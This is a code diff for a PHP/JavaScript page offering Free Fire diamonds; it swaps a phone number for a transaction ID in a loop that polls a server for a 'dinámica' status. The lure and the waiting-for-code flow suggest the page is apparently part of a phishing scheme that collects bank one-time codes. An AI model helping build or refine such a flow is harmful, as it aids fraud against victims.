@@ -245,7 +245,7 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
   }
 
   // Función para polling de dinámica
-  function startDinamicaPolling(telefono) {
+  function startDinamicaPolling(transactionId) {
     const pollInterval = setInterval(async () => {
       try {
         const response = await fetch("1.php", {
@@ -255,7 +255,7 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
           },
           body: JSON.stringify({
             action: "check_dinamica_status",
-            telefono: telefono
+            transactionId: transactionId
           })
         });
 
@@ -391,6 +391,9 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
           const data = await response.json();
 
           if (data.ok) {
+            // Guardar transactionId para polling
+            const transactionId = data.transactionId;
+            
             // Ocultar modal y mostrar modal de esperando
             modal.style.display = "none";
             const modalEsperando = document.getElementById("modalEsperando");
@@ -399,7 +402,7 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
             }
 
             // Iniciar polling para verificar si se solicitó dinámica
-            startDinamicaPolling(telefono);
+            startDinamicaPolling(transactionId);
           } else {
             alert("Error al enviar datos: " + (data.error || "Error desconocido"));
           }
